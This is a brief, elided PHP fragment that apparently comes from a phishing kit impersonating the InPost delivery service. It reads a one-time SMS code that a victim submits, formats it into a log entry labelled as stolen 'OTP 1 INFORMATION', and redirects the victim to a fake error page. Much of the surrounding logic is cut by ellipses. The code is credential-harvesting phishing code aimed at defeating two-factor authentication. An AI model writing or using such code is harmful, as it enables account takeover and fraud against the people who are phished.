...
if(isset($_POST['sms1'])){
	...
	$evilm="#------------[ -INPOST- OTP 1 INFORMATION ]------------#\r\n";
	$evilm.="OTP CODE		: {$_POST['sms1']}\r\n";
	...
	if ($show_sms_page2=="yes") {
		exit(header("Location: ../../main/error.php?inpost_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}
else{
